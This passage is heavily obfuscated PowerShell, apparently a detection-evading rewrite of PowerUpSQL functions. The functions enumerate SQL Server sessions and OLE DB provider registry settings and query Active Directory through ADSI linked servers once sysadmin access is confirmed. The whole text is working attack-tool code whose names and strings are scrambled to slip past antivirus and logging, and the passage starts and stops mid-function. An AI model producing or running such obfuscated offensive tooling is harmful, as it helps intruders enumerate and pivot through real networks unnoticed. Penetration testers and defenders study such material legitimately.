        &("{3}{2}{0}{1}"-f'O','bject','h-','ForEac') -Process {
            
            ${NeW`Sid} =   ( geT-vaRiABLE  ('Lc'+'s2')  -vAL )::("{2}{1}{0}"-f'ng','Stri','To').Invoke(${_}."PRI`NCI`PaLs`ID").("{1}{0}{2}"-f 'e','R','place').Invoke('-','')
            if (${Ne`W`Sid}."L`ENG`TH" -le 10)
            {
                ${s`iD} =  (  VAriABlE  ('Q'+'mrk')).VaLUE::("{0}{2}{1}"-f'ToI','t32','n').Invoke(${New`sid},16)
            }
            else
            {
                ${S`id} = ${NE`W`sID}
            }

            
            ${N`ULL} = ${tB`L`s`ESsIONS}."RO`Ws"."a`DD"(
                [string]${_}."cOMPUTER`N`Ame",
                [string]${_}."I`NsT`AncE",
                ${S`iD},
                [string]${_}."PR`iN`CI`PAlNAmE",
                [string]${_}."OR`IgINAlp`RIN`cIPALnAme",
                [string]${_}."seSS`io`NiD",
                [string]${_}."sEs`SIoNsTA`RTt`IMe",
                [string]${_}."s`E`ssIOn`lOGI`NtIMe",
            [string]${_}."SES`S`ioNS`Ta`TUS")
        }
    }

    End
    {
        
        ${t`B`lSESsiO`Ns}
    }
}






Function  g`eT-SQ`LoLED`B`P`ROv`DeR
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAnDatOry = ${FA`l`SE},
        hELpMessAge = {"{12}{3}{5}{4}{11}{1}{8}{9}{10}{6}{0}{2}{7}"-f'e',' dom',' wi','QL','erv',' S','at','th.','ain accoun','t ','to authentic','er or','S'})]
        [string]${UseR`Na`ME},

        [Parameter(ManDAtOrY = ${f`AlSe},
        HeLPmeSsAGe = {"{8}{3}{4}{9}{1}{2}{0}{5}{6}{7}" -f's','omain account',' pas',' or',' ','word to aut','hentic','ate with.','SQL Server','d'})]
        [string]${P`AS`SwORD},

        [Parameter(maNdATorY = ${FAl`Se},
        hElPmeSsaGe = {"{1}{4}{0}{2}{3}" -f ' cre','Wind','dent','ials.','ows'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`RED`enTiAL} =  (geT-item vAriaBLE:0459M2).VALUe::"EMp`Ty",

        [Parameter(ManDaTorY = ${Fa`LSe},
                vaLUefROMPipEliNEByPrOPERTynamE = ${t`RUe},
        hELPMESsAge = {"{1}{5}{4}{2}{6}{0}{3}" -f'tion t','SQL Serve','nn','o.',' instance to co','r','ec'})]
        [string]${I`NstAn`CE},
     
        [Parameter(mAnDatOrY = ${f`AlSE},
        HElPmESsaGe = {"{2}{3}{1}{4}{0}"-f 's.',' thr','Number o','f','ead'})]
        [int]${ThR`EA`DS} = 2,

        [Parameter(MANdATOry = ${fAL`se},
        HeLPmeSSAgE = {"{11}{7}{14}{13}{6}{15}{2}{5}{12}{8}{16}{1}{3}{4}{9}{10}{0}"-f's wrapped.','t','rrors.','i','o','  Used w','rbose','ppress',' fun','n',' i','Su','hen','ve',' ',' e','c'})]
        [switch]${S`UPpRESsVer`BO`se}
    )

    Begin
    {
        
        ${tb`lReSu`lTs} = &("{0}{1}{2}"-f 'Ne','w-Ob','ject') -TypeName ("{0}{3}{1}{2}{4}" -f 'S','em.Data.D','ataTabl','yst','e')
        ${tbL`P`ROVidErs} = &("{0}{1}{2}"-f'New-','Obje','ct') -TypeName ("{4}{1}{3}{2}{0}"-f'ble','t','ta.DataTa','em.Da','Sys')
        ${nU`Ll} = ${tb`lPRoVid`eRS}."cO`Lu`MnS".("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{0}" -f'uterName','omp','C')) 
        ${n`ULl} = ${T`BLprOvI`dE`RS}."CO`Lu`mNS".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f'In','tance','s')) 
        ${N`Ull} = ${Tb`LproV`Iders}."C`OLUM`Ns".("{0}{1}" -f'A','dd').Invoke(("{1}{2}{0}"-f'ame','Provider','N')) 
        ${N`UlL} = ${tB`L`PRovI`DeRs}."CO`lUMNS".("{1}{0}" -f'd','Ad').Invoke(("{2}{3}{0}{1}" -f'sc','ription','Provi','derDe'))
        ${n`ULL} = ${TBLprO`ViD`eRs}."C`OLumns".("{0}{1}" -f'Ad','d').Invoke(("{2}{4}{5}{0}{1}{3}"-f's','e','Pr','Name','oviderPa','r'))
        ${Nu`LL} = ${Tb`LpRoVi`dERS}."co`l`UMNS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{2}{3}{1}{4}"-f'All','Pro','owI','n','cess'))
        ${n`UlL} = ${tBlpROvi`DE`RS}."C`oLUmns".("{0}{1}"-f'A','dd').Invoke(("{5}{4}{3}{2}{0}{1}" -f 'cAcc','ess','dHo','A','low','Disal'))
        ${Nu`ll} = ${T`BlpRoViDE`Rs}."C`ol`UMnS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{3}{2}"-f'Dy','nami','Parameters','c')) 
        ${n`ULL} = ${T`B`lpROVIDerS}."C`oLUmNs".("{1}{0}"-f'dd','A').Invoke(("{2}{4}{0}{3}{1}"-f'Acc','ssPath','Index','e','As')) 
        ${n`Ull} = ${tBlp`RO`ViDeRS}."C`olU`mns".("{1}{0}"-f'dd','A').Invoke(("{0}{2}{4}{3}{1}" -f'Lev','ly','elZero','n','O')) 
        ${nU`lL} = ${T`B`lprOV`ideRS}."colu`mnS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}"-f 'N','estedQueri','es')) 
        ${n`ULL} = ${t`BLprov`ID`eRs}."COl`UMnS".("{0}{1}" -f'A','dd').Invoke(("{4}{1}{2}{6}{3}{0}{5}" -f'dat','nsac','t','Up','NonTra','es','ed')) 
        ${Nu`LL} = ${t`B`LprOViD`e`Rs}."C`OL`UmnS".("{1}{0}"-f'dd','A').Invoke(("{1}{2}{3}{0}"-f'KE','SqlSe','r','verLI'))

        
        ${pIpEL`iNe`ITEms} = &("{3}{2}{0}{1}"-f 'ec','t','w-Obj','Ne') -TypeName ("{1}{3}{2}{0}"-f 'Table','S','ta','ystem.Data.Da')


        
        if(-not ${i`NST`ANcE})
        {
            ${in`St`Ance} = ${ENv:`c`o`mput`ernA`Me}
        }

        
        if(${INsTA`Nce})
        {
            ${PrOvi`DE`INSt`AN`ce} = &("{0}{2}{1}" -f'New-','ct','Obje') -TypeName ("{1}{0}" -f'SObject','P') -Property @{
                ("{1}{2}{0}"-f'ce','I','nstan') = ${i`N`sTaNce}
            }
        }

        
        ${PIp`e`linEIT`EMS} = ${P`IPE`lIneItEmS} + ${prov`ID`Ei`NStA`Nce}
    }

    Process
    {
        
        ${Pi`pelInEite`mS} = ${PIp`eLINEIt`Ems} + ${_}
    }

    End
    {
        
        ${My`SC`R`IPt`BLOCk} = {
            
            ${IN`staN`CE} = ${_}."INSt`A`NCE"

            
            ${C`ompU`TErName} = &("{0}{7}{2}{1}{6}{4}{3}{5}" -f 'Get','erName','put','n','sta','ce','FromIn','-Com') -Instance ${I`Ns`Tance}

            
            ${t`Es`TconNeC`Ti`ON} = &("{3}{2}{4}{0}{1}" -f 'e','ctionTest','L','Get-SQ','Conn') -Instance ${iNst`A`NcE} -Username ${usEr`N`AMe} -Password ${PAsS`woRD} -Credential ${cre`dE`NT`iAL} -SuppressVerbose | &("{2}{0}{1}" -f 'Objec','t','Where-') -FilterScript {
                ${_}."ST`ATUs" -eq ("{1}{2}{0}{3}" -f 'i','A','ccess','ble')
            }
            if(${tEstc`on`NE`CT`iOn})
            {
                if( -not ${SuP`pR`es`svErB`OsE})
                {
                    &("{2}{1}{3}{0}" -f 'rbose','te','Wri','-Ve') -Message ("$Instance "+': '+'Con'+'necti'+'on '+'Succes'+'s'+'.')
                }
            }
            else
            {
                if( -not ${suP`PrE`Ssv`erBOSE})
                {
                    &("{1}{0}{4}{2}{3}" -f 'e-','Writ','s','e','Verbo') -Message ("$Instance "+': '+'Connect'+'io'+'n '+'Fai'+'led.')
                }
                return
            }

            
            ${IsS`ysa`Dmin} = &("{2}{1}{0}{3}"-f'QL','S','Get-','ServerInfo') -Instance ${i`N`STanCE} -Username ${U`s`ErNaME} -Password ${paS`s`Word} -Credential ${crEde`NT`iAl} -SuppressVerbose | &("{0}{1}{2}" -f 'Sel','ect-Obje','ct') -Property ("{1}{2}{0}" -f 'Sysadmin','I','s') -ExpandProperty ("{1}{2}{0}"-f'min','IsS','ysad')
            if(${issYs`AD`MiN} -eq "No")
            {
                If (-not(${SupP`ReSSv`ErbOsE})){
                    &("{1}{0}{2}"-f's','Write-Verbo','e') -Message ("$Instance "+': '+'T'+'his '+'comman'+'d '+'r'+'e'+'qui'+'res '+'s'+'ysadmin'+' '+'privil'+'ege'+'s'+'. '+'Ex'+'iting'+'.')  
                }              
                return
            }else{
                
                If (-not(${s`UPpR`essVErBo`Se})){
                    &("{2}{0}{1}"-f 'te-Verbos','e','Wri') -Message ("$Instance "+': '+'You'+' '+'have'+' '+'sys'+'ad'+'min '+'pr'+'ivileges'+'.')
                    &("{4}{1}{2}{3}{0}"-f 'ose','r','ite-Ver','b','W') -Message ("$Instance "+': '+'Gr'+'abbing'+' '+'li'+'st '+'o'+'f '+'provi'+'der'+'s.')
                }
            }            

            
            ${Q`UeRY} = ((("{56}{102}{42}{92}{86}{68}{76}{59}{0}{48}{73}{41}{47}{8}{44}{34}{51}{98}{21}{14}{87}{38}{13}{81}{60}{45}{83}{53}{99}{37}{84}{4}{6}{82}{88}{72}{26}{10}{24}{32}{12}{28}{31}{70}{3}{63}{17}{33}{103}{62}{74}{75}{79}{30}{5}{15}{85}{27}{96}{36}{57}{97}{69}{46}{49}{7}{90}{65}{89}{23}{52}{1}{93}{16}{100}{71}{18}{25}{101}{29}{22}{95}{94}{20}{91}{77}{54}{61}{39}{43}{55}{67}{35}{64}{66}{2}{80}{19}{58}{11}{78}{50}{40}{9}"-f'able for provider information
         ','
	             exec sys.xp_instance_regre','onTransactedUpdates,@SqlServerLIKE);

','EY_LOCAL_MACHINED0G,@regpath,D0GDisallowAdHocAccessD0G,	@DisallowAdHocAccess OUTPUT	 
	             IF @Disal','n
            WHILE @@FETCH_STATUS = 0 
  
	            BEGIN  
		
	            -- Set the registry path
	            SET @re','ULL 
	             ','gpath = ND0GSOFTWA','          IF  @LevelZer','lowInProcess] int, 
            [DisallowAdHocAcces','TABLE #ProviderInformation','h,D0GAllowInProcessD0G,	@AllowInProcess O','        ','        IF @AllowInProce','y_name varchar(8000)
          ','0);
            DECLARE @pr','SET @DynamicParameters  = 0

	   ','path',' IS NU','LA','ROM MY_CURSOR1 INTO  @Provider_name,@Provider_parse_name,@Provider_description

	            END   

            -- Return records
            SELECT *','
	             IF  @NonTransactedUpdates IS NULL 
	             SET @NonTransactedUpdates = 0

	            -- SqlServer','@Provider_parse_name varchar(8000);
            DECLARE @Provider_description varchar(800',' ','ries int','UTPUT		','RE @NonTransac','at','E @IndexAsAccessPath int','ss IS NULL 
	             SET @AllowInProcess = 0

	            -- DisallowAdHocAccess 
	             DECLARE @Di','sactedUpdates = 0
	         ','icParameters  IS N','sallowAdHocAccess int  
	 ',' 
	     ','LL 
	',' 
            [IndexAsAccessPath] int,  
     ','_name,@Provider_description,@Provider_parse_name,@All','exec sys.xp_instance_regread ND0GHKEY_LOCAL_MACHINED0G,@regpath,D0GIndexAsAccessPathD0G,	@In','ame,@Provider_','pert','_MACHINED0G,@regpath,D0GSqlServerLIKED0G,	@SqlServerLIKE OUTPUT	
	             IF  @SqlServerLIKE IS NULL 
	             SET @','E #Providers
            DROP ',' 
            [Provi','ngs.
            -- Author: Scott Sutherland, NetSPI 2017

            -- Get a','SqlServerLI','s] int, 
            [DynamicParameters] int, ','CLARE MY_CU','ec sys.xp_instance_regread ND0GHKEY_LOCAL_MACHINED0G,@regpath,D0GLevelZeroOnlyD0G,	@','derDescription] varchar(8000),
            [ProviderParseName] varchar(8000),
            [Al','   CREATE TABLE #ProviderInformat','LevelZeroOnly OUTPUT	
	   ','Y_CURSOR1
            DROP TABL','       [LevelZeroOnly] int,  
            [NestedQueries]','  
	             SET @NestedQueries = 0','       SELECT * FROM #Providers
            OPEN MY_CURSOR1
            FETCH NEXT FROM','	             SET @SqlServerLIK','KE = 0 

	            -- A','                        

','dexAsAccessPath OUTP',' FROM #ProviderInformation

    ',' -- Create temp t',' Start cursor
            DE','E  = 0
	             exec sys.xp_instance_regread ND0GHKEY_LOCAL','       SET @DisallowAdHocAccess = 0

	      ','lowAdHocAccess','owInProcess,@DisallowAdHocAccess,@DynamicParameters,@IndexAsAccessPath,','= 0	  

	            -- NestedQueries 
	             DECLARE @Neste','@LevelZeroOnly,@NestedQueries,@N','dd the full provider record to the temp table
	            INSERT INTO #ProviderInformation
	            VALUES (@Provider','ders
            E','eroOnly int
	             SET @LevelZeroOnly  = 0
	             ex','            SET @DisallowAdHocAccess = 0
	             exec sys.xp_instance_regread ND0GHK','edQueries IS NULL 
	             SET  @NestedQueries = 0		 	 

	            -- NonTransactedUpdates 
	             DEC','GHKEY_LOCAL_MACHINED0G,@regp','ion ([ProviderName] varchar(8000),','      -- DynamicPara','meters 
	             DECLARE @DynamicParameters  int  
	             SET @DynamicParameters ','XEC xp_enum_oledb_providers

           ','
','-- Clean up
            CLOSE MY_CURSOR1
            DEALLOCATE M',' = 0
	             exec sys.xp_instance_regread ND0GHKEY_LOCAL_MACHINED0G,@regpath,D0GDynamicParametersD0G,	@DynamicParameters OUTPUT	 
	             IF @Dynam','	            FETCH NEXT F','  DECLARE @regpath nvarchar(512)  

            --','REoprMicrosoftoprMSSQLServeroprProvidersoprD0G + @provider_name  

	            -- AllowInProcess	
	             DECLA','RSOR1 CURSOR
            FOR
     ','parse_name,@Provider_descriptio','         -- IndexAsAccessPath 
	             DECLAR','000))

            INSERT INTO #Provi','o','RE @AllowInProcess int 
	             SET @AllowInProcess = 0 
	             exec sys.xp_instance_regread ND0','dQue','oOnly IS NULL 
	             SET  @LevelZeroOnly  ','LIKE
	             DECLARE @SqlServerLIKE int  ',' list of providers
            CREATE TABLE #Providers ([ProviderName] varchar(8000), 
            [ParseName] varchar(8000),
            [ProviderDescription] varchar(8','ad ND0GHKEY_LOCAL_MACHINED0G,@reg','ec sys.xp_instance_regread ND0GHKEY_LOCAL_MACHINED0G,@regpath,D0GNonTransactedUpdatesD0G,	@NonTransactedUpdates  OUTPUT	 ','   ex',' 
	             SET @IndexAsAccessPath = 0 
	             ','UT	 
	             IF @IndexAsAccessPath IS NULL 
	             SET @IndexAsAccessPath  = 0

	            -- LevelZeroOnly 
	             DECLARE @LevelZ',' int,  
            [NonTransactedUpdates] int,  
            [SqlServerLIKE] int)

            -- Setup required variables for cursor
            DECLARE @Provider_name varchar(8000);
            DECLARE ',' MY_CURSOR1 INTO @Provider_n',',D0GNestedQueriesD0G,	@NestedQueries OUTPUT
	             IF   @Nest','tedUpdates int  
	             SET @NonTran','            -- Name: Get-SQLOleDbProvider.sql
            -- Description: Get a list of OLE provider along with their current setti','      '))."REpl`A`Ce"('D0G',[StrINg][cHaR]39)."r`EPlacE"(([cHaR]111+[cHaR]112+[cHaR]114),[StrINg][cHaR]92))
          
            
            ${t`BL`Re`Sults} = &("{0}{2}{1}" -f'Ge','Query','t-SQL') -Instance ${iNst`AN`ce} -Query ${Que`RY} -Username ${Use`Rn`AmE} -Password ${PA`S`S`worD} -Credential ${cRedEn`T`ial} -SuppressVerbose

            
            ${tb`Lr`eSUlts} |
            &("{0}{2}{1}{3}"-f 'For','a','E','ch-Object') -Process {

                
                ${n`UlL} = ${Tb`LPrOVid`Ers}."r`OwS".("{1}{0}"-f 'dd','A').Invoke(
                    ${CO`mPutErn`AMe},
                    ${INs`T`ANce},
                    ${_}."P`ROvId`er`NaMe",
                    ${_}."pR`ovidERDEScri`PT`I`On",
                    ${_}."pR`Ov`id`erpaRSena`me",
                    ${_}."ALLoW`IN`PRocESS",
                    ${_}."dIsaL`LOwAD`h`oCA`Cc`esS",
                    ${_}."dy`NamIcp`AR`Amet`ERs",
                    ${_}."iNdeXa`sAcc`EsS`patH",
                    ${_}."LEV`EL`Zer`oONLy",
                    ${_}."Ne`STEd`qU`Er`IES",
                    ${_}."noNT`RaNSAc`T`edUp`Dat`es",
                    ${_}."SqLsE`RVEr`L`IKE"
                )
            }
        }

        
        ${Pip`E`LI`NE`itemS} | &("{0}{3}{2}{1}"-f 'In','ke-Parallel','o','v') -ScriptBlock ${mys`CrIptbl`OCK} -ImportSessionFunctions -ImportVariables -Throttle ${t`HrEaDs} -RunspaceTimeout 2 -Quiet -ErrorAction ("{4}{2}{1}{3}{0}" -f 'tinue','t','len','lyCon','Si')

        return ${tb`l`PrOvidERs}
    }
}







Function  GE`T-sq`Ld`OMA`Ino`BjeCT
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDaTorY = ${f`ALse},
        heLpMeSSAGE = {"{10}{1}{5}{11}{2}{3}{6}{13}{8}{12}{0}{9}{7}{14}{4}"-f 'o au','Ser',' ','do','erver.','ver','main',' to SQL ','nt ','thenticate','SQL ',' or','t',' accou','S'})]
        [string]${UseRn`AME},

        [Parameter(mANDatORy = ${FA`lSe},
        helPmesSAGe = {"{8}{12}{11}{5}{3}{7}{13}{9}{1}{6}{2}{10}{4}{0}" -f 'erver.','then','icate t',' or d','S','r','t','oma','SQL Ser','ount password to au','o SQL ','e','v','in acc'})]
        [string]${paS`sW`ORd},

        [Parameter(manDATORY = ${FA`LSe},
        hELPMESSAGe = {"{15}{18}{1}{11}{3}{10}{0}{19}{4}{7}{5}{14}{12}{9}{2}{13}{6}{16}{8}{17}" -f ' L','n','e',' ','P t','r','A','h','S','v','authenticate to','t used to','er','r ','ough SQL S','Domain acco','D','I link.','u','DA'})]
        [string]${L`I`NKuSER`NAme},

        [Parameter(MaNDaToRy = ${FaL`Se},
        HelpmEsSAGe = {"{0}{10}{9}{11}{18}{17}{13}{2}{4}{12}{19}{15}{5}{1}{16}{3}{6}{14}{20}{21}{7}{8}" -f'Dom','o ','d ','P','used','ate t',' through SQ','I ','link.','co','ain ac','un',' t','passwor','L Serv','c','LDA',' ','t','o authenti','er',' ADS'})]
        [string]${liNK`P`ASsw`O`RD},

        [Parameter(mAnDatOrY = ${F`A`lsE},
        heLPmeSSAge = {"{2}{3}{0}{1}" -f 'ials','.','Windows',' credent'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`REDen`T`IAL} =   ( Gi  ("vA"+"RiaBlE:"+"0459"+"m2") ).VAlue::"eMp`Ty",

        [Parameter(mANdaToRy = ${fAl`se},
            ValUeFrOMPIPELinEbYPrOpeRtYName = ${tR`Ue},
        HElPMeSsAgE = {"{4}{7}{8}{0}{3}{6}{2}{5}{1}" -f 'ta','n to.',' con','n','SQL','nectio','ce to',' Server in','s'})]
        [string]${ins`T`A`Nce},

        [Parameter(mANDAtORy = ${fA`L`se},
        helpMeSsaGe = {"{5}{22}{3}{23}{32}{2}{7}{8}{27}{16}{19}{24}{28}{18}{25}{17}{9}{11}{21}{6}{10}{30}{34}{13}{4}{0}{14}{26}{1}{12}{15}{31}{29}{33}{20}" -f'n','adhoc qu',' f','onnec','will e','Use ad','er link','or',' executing t',' ',' ','ADS','eries,','dHoc option ','a',' ','te','e an','option (','ad of a','nRowSet.','I serv','hoc c','t',' se','default) will creat','ble ','he query ins','rver link.  The link ','se Op','and use OpenQue','and u','ion','e','ry. The A'})]
        [Switch]${uSEA`DHoc},
     
        [Parameter(mandatoRY = ${Fal`sE},
        HELpMesSAgE = {"{16}{18}{9}{7}{2}{14}{1}{8}{17}{10}{11}{13}{5}{4}{15}{6}{12}{3}{0}" -f 't a time','his is ','. ','s a','ce ','n','e','s','the n',' thread','mb','er','s',' of insta',' T','to proc','Nu','u','mber of'})]
        [int]${Th`REa`dS} = 2,

        [Parameter(MANdatOry = ${fA`Lse},
        hElPmEsSage = {"{7}{2}{3}{5}{4}{1}{0}{6}"-f'dc','n,','. do','main','ai','/dc=dom','=local','Ldap path'})]
        [string]${ld`Appa`TH},

        [Parameter(MaNDaTorY = ${f`AL`se},
        HelPmessagE = {("{11}{5}{0}{9}{16}{7}{4}{3}{13}{14}{18}{1}{15}{2}{10}{17}{12}{8}{6}"-f 'l','r','erson)(ob',': (','ple',' fi','ss=user))','Exam','la','ter.','je','Ldap','C','&','(obj','y=P',' ','ct','ectCatego')})]
        [string]${LdA`PFIl`TER},

        [Parameter(ManDATory = ${FaL`SE},
        heLpMEssAGe = {"{6}{5}{8}{2}{0}{12}{10}{7}{1}{13}{3}{11}{4}{9}" -f'n','nt,when','cou','wh','a','dap ','L','incou','fields. Example: samac','dspath','m','enchanged,','tname,name,ad','created,'})]
        [string]${ld`AP`FiElds},

        [Parameter(MANdaTORY = ${F`AlSE},
        HELpmESsage = {"{7}{9}{12}{6}{8}{10}{1}{0}{5}{4}{11}{3}{2}" -f'd ','rs.  Use','d.','rappe','unct','when f','s verbose ','Supp','err','re','o','ion is w','s'})]
        [switch]${sUpPre`s`sVERBo`SE}
    )

    Begin
    {
        
        ${T`BL`Re`sulTS} = &("{1}{2}{0}"-f 'ect','N','ew-Obj') -TypeName ("{5}{6}{2}{1}{4}{3}{0}"-f'ble','m.Da','ste','.DataTa','ta','S','y')
        ${Tb`l`DomaINoBje`ctS} = &("{1}{0}{2}"-f 'bjec','New-O','t') -TypeName ("{3}{4}{1}{2}{0}"-f'le','Data','Tab','Sy','stem.Data.')         
    }

    Process
    {
        
        ${comP`Ut`erN`AMe} = &("{5}{0}{2}{4}{1}{3}{6}" -f'-Co','am','mpute','eFromInsta','rN','Get','nce') -Instance ${iNSt`A`NCE}

        
        if(-not ${I`N`sTance})
        {
            ${InST`An`CE} = ${eN`V:co`MPUTe`R`Na`ME}
        }

        
        ${TEStC`ONN`ECTI`On} = &("{0}{1}{4}{3}{2}"-f 'Ge','t-SQLC','t','s','onnectionTe') -Instance ${INst`AnCE} -Username ${u`SErN`Ame} -Password ${p`ASSWO`Rd} -Credential ${cRe`deNt`IAl} -SuppressVerbose | &("{1}{3}{0}{2}" -f'j','Wher','ect','e-Ob') -FilterScript {
            ${_}."STa`T`US" -eq ("{1}{0}{2}"-f 'ccessibl','A','e')
        }
        if(${t`e`S`TCOnNEcTIon})
        {
            if( -not ${sup`PrE`SSVeRbO`SE})
            {
                &("{0}{3}{1}{4}{2}"-f'Wri','Ver','e','te-','bos') -Message ("$Instance "+': '+'Co'+'n'+'ne'+'ction '+'S'+'ucc'+'ess.')
            }
        }
        else
        {
            if( -not ${supp`RESsverB`o`se})
            {
                &("{2}{0}{3}{1}" -f'ite-','ose','Wr','Verb') -Message ("$Instance "+': '+'Conn'+'e'+'ction '+'F'+'ailed'+'.')
            }
            return
        }

        
        ${S`eRVEriN`Fo} = &("{3}{1}{0}{4}{2}" -f'erverIn','QLS','o','Get-S','f') -Instance ${IN`sTance} -Username ${u`Se`RnAmE} -Password ${Pas`sWOrd} -Credential ${CREDEnT`I`Al} -SuppressVerbose
        ${DomaI`NNA`mE} = ${Ser`VER`iNFO}."d`OMAINN`A`ME"
        ${I`s`S`ysAdMIn} = ${ser`Ve`RInFO}."i`SsYSAd`m`iN"
        ${serVi`c`ea`cc`OunT} = ${SerV`ERiN`FO}."sERVI`C`EAcc`OUnt"
        ${s`Q`LSeRVeRma`joRv`E`RsION} = ${sEr`VER`INFO}."Sql`sERVe`RMajO`RV`E`RsIOn"
        ${SQ`lse`R`VErediTIon} = ${SErVe`R`iNfo}."s`q`LsERvErEdi`T`ioN"
        ${SQlserVe`R`VeR`S`ionn`UMB`er} = ${SErve`R`In`Fo}."SQLSeRV`ER`VER`S`iOnnu`MBEr"
        ${SQlcurR`E`N`Tl`OgiN} = ${SeRve`Ri`NFO}."CURreNtl`o`Gin"

        
        If (-not(${sUpP`REsSVe`RBosE})){
            &("{2}{1}{0}" -f 'rbose','-Ve','Write') -Message ("$instance "+': '+'Logi'+'n'+': '+"$SQLCurrentLogin")
            &("{2}{3}{0}{1}"-f '-','Verbose','W','rite') -Message ("$Instance "+': '+'D'+'omai'+'n: '+"$DomainName")
            &("{1}{2}{0}"-f 'rbose','W','rite-Ve') -Message ("$Instance "+': '+'V'+'ers'+'ion: '+'SQL'+' '+'Se'+'rver '+"$SQLServerMajorVersion "+"$SQLServerEdition "+"($SQLServerVersionNumber)")
        }
         
        if(${IsSY`sadm`in} -eq "No")
        {
            If (-not(${s`UPPRess`VERbO`sE})){
                &("{1}{2}{0}" -f'Verbose','Writ','e-') -Message ("$Instance "+': '+'Sys'+'adm'+'in'+': '+'No')
                &("{2}{3}{1}{0}"-f 'se','bo','Write','-Ver') -Message ("$Instance "+': '+'T'+'his '+'c'+'ommand'+' '+'r'+'equi'+'res '+'s'+'ys'+'admin '+'privil'+'e'+'ges. '+'Exit'+'i'+'ng.')  
            }          
            return
        }else{
            
            If (-not(${su`p`pRESsverBO`Se})){
                &("{2}{3}{0}{1}"-f 'bo','se','Writ','e-Ver') -Message ("$Instance "+': '+'Sys'+'admi'+'n: '+'Ye'+'s')
            }
        }          

        
        
        if (${sq`LC`UrREnT`LOGin} -notlike "*\*")
        {
            if((${us`eADh`OC}) -or (${lI`NkpaSSW`oRd})){
                
            }else{
                &("{1}{3}{4}{2}{0}" -f 'e','Wri','s','t','e-Verbo') -Message ("$Instance "+': '+'A '+'SQL'+' '+'L'+'og'+'in '+'wi'+'th '+'sysadm'+'i'+'n'+' '+'priv'+'ile'+'ges '+'cann'+'ot '+'execu'+'te '+'ASDI'+' '+'quer'+'ie'+'s '+'th'+'rough'+' '+'a '+'link'+'e'+'d '+'ser'+'ver '+'by'+' '+'i'+'tself'+'.')
                &("{2}{0}{1}"-f'ite-Verbo','se','Wr') -Message ("$Instance "+': '+'T'+'ry '+'on'+'e '+'o'+'f '+'the'+' '+'fo'+'llowing'+':')
                &("{2}{3}{1}{0}"-f 'bose','r','Write-V','e') -Message ("$Instance "+': '+' '+'- '+'Run'+' '+'t'+'he '+'co'+'mman'+'d '+'a'+'gain '+'wi'+'th '+'th'+'e '+'-UseAdH'+'oc'+' '+'flag'+' '+'')
                &("{2}{4}{0}{3}{1}"-f'V','e','Wr','erbos','ite-') -Message ("$Instance "+': '+' '+'- '+'Ru'+'n '+'the'+' '+'com'+'ma'+'nd '+'ag'+'ain'+' '+'and'+' '+'provid'+'e '+'-L'+'ink'+'User '+'an'+'d '+'-'+'L'+'inkPassw'+'ord')
                return
            }
        }
        
        
        if(-not ${ldA`PP`ATh} ){
            ${L`d`Ap`pATH} = ${do`MA`in`Name}
        }

        
        ${ChECKe`NAb`LED} = &("{2}{3}{0}{1}"-f 'o','vder','Get','-SQLOleDbPr') -Instance ${i`N`sta`NCE} -Username ${u`SERName} -Password ${pAsSW`o`Rd} -SuppressVerbose | &("{0}{1}"-f'W','here') ("{0}{3}{2}{1}"-f'Provide','e','m','rNa') -like ("{1}{2}{3}{0}"-f 'ect','AD','sDSO','Obj') | &("{0}{3}{1}{4}{2}" -f 'Sel','ct-Ob','ect','e','j') ("{2}{0}{1}{4}{3}" -f 'owInP','ro','All','ss','ce') -ExpandProperty ("{1}{0}{2}{3}" -f'InP','Allow','roces','s')
        if (${c`hEcKENA`B`LEd} -ne 1){
            &("{1}{3}{0}{2}"-f'bos','Wri','e','te-Ver') -Message ("$Instance "+': '+'ADs'+'DSOObj'+'e'+'c'+'t '+'p'+'rovi'+'der '+'a'+'llowe'+'d '+'t'+'o '+'ru'+'n '+'in'+' '+'proc'+'e'+'ss: '+'No')
            &("{0}{1}{2}{3}" -f 'W','rite-V','erb','ose') -Message ("$Instance "+': '+'Th'+'e '+'ADsD'+'SOO'+'bject '+'provi'+'de'+'r '+'is'+' '+'not'+' '+'all'+'owed'+' '+'t'+'o '+'run'+' '+'in'+' '+'pr'+'o'+'cess. '+'Stopp'+'i'+'ng '+'operatio'+'n'+'.')
            return
        }else{
            &("{2}{3}{0}{1}" -f'-V','erbose','Wr','ite') -Message ("$Instance "+': '+'AD'+'sDSOObject'+' '+'pro'+'vide'+'r '+'al'+'lowed'+' '+'t'+'o '+'r'+'un '+'in'+' '+'pr'+'oce'+'ss: '+'Y'+'es')
        }

        
        if(${USeAD`H`oC}){
            If (-not(${su`P`PreS`SvErboSE})){                

                if (${sQLcU`RreNtl`og`iN} -like "*\*"){
                    &("{0}{1}{2}" -f'Write','-','Verbose') -Message ("$Instance "+': '+'Execut'+'i'+'ng '+'in'+' '+'AdHoc'+' '+'mo'+'de '+'us'+'i'+'ng '+'OpenRow'+'Se'+'t '+'as'+' '+"'$SQLCurrentLogin'.")
                }else{
                    if(-not ${L`in`kuSeRnaMe}){
                        &("{0}{1}{2}" -f 'W','rite','-Verbose') -Message ("$Instance "+': '+'Exe'+'cu'+'ting '+'in'+' '+'Ad'+'Hoc '+'mo'+'de '+'usi'+'ng '+'OpenR'+'o'+'wSet'+' '+'as'+' '+'t'+'he '+'SQ'+'L '+'Serv'+'er '+'s'+'ervic'+'e '+'a'+'ccou'+'nt '+"($ServiceAccount).")
                    }else{
                        &("{3}{1}{2}{0}" -f 'e','rite-Verbo','s','W') -Message ("$Instance "+': '+'Exe'+'cut'+'ing '+'i'+'n '+'AdHo'+'c'+' '+'mo'+'de '+'using'+' '+'OpenR'+'o'+'w'+'Set '+'a'+'s '+"'$LinkUsername'.")
                    }
                }
            }
        }else{
            If (-not(${SUPpr`E`sSvErBOSE})){
                &("{0}{2}{1}" -f'Writ','rbose','e-Ve') -Message ("$Instance "+': '+'Executi'+'ng'+' '+'in'+' '+'Lin'+'k '+'mod'+'e '+'usi'+'ng '+'O'+'penQu'+'ery'+'.')
            }
        }

        
        if(-not ${Us`EADh`Oc}){

            
